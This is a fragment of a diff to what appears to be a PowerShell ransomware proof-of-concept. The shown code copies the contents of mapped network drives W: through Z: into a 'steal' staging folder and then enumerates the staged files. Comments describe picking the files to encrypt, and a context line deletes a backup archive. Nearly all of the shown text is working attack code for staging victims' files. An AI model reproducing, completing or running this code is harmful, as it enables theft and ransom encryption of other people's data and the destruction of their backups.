@@ -107,7 +107,7 @@ Remove-Item c:\temp\backup1.zip
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
 $Source = "W:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
-$Destination = "c:\temp\w"
+$Destination = "c:\temp\steal\w"
 
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
@@ -117,7 +117,7 @@ ELSE
 $cp = robocopy /E $Source $Destination
 
 $Source = "X:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
-$Destination = "c:\temp\x"
+$Destination = "c:\temp\steal\x"
 
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
@@ -127,7 +127,7 @@ ELSE
 $cp = robocopy /E $Source $Destination
 
 $Source = "Y:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
-$Destination = "c:\temp\y"
+$Destination = "c:\temp\steal\y"
 
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
@@ -137,7 +137,7 @@ ELSE
 $cp = robocopy /E $Source $Destination
 
 $Source = "Z:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
-$Destination = "c:\temp\z"
+$Destination = "c:\temp\steal\z"
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
@@ -146,7 +146,7 @@ ELSE
 $cp = robocopy /E $Source $Destination
 # Start-Sleep -s 5
 
-$Destination = "C:\temp\"
+$Destination = "C:\temp\steal"
 $files = Get-ChildItem -Path $Destination -Recurse
 
 For($i = 1; $i -le $files.count; $i++)
